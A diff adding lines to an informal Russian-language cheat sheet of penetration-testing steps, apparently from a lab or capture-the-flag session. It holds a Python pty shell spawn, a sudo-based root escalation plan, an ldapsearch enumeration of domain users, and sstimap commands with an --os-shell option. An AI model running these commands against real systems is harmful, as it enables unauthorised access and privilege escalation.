@@ -1,2 +1,12 @@
 обход админки через спавн шелла питон python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo -l посмотреть чё можешь выполнять от судо и в доступные файлы записать sh дабы права повысить, потом passwd и от рута подключится
+потом он чёт черз ldap поискал 
+ldapsearch -x -H ldap://192.168.1.10 \
+-D "user@domain.local" -W \
+-b "DC=domain,DC=local" \
+"(objectClass=user)"
 
+далее ssti
+sstimap -u "http://target.com/page?name=test"
+sstimap -u http://target --data "name=test"
+можно дописать --os-shell дабы шелл получить сразу
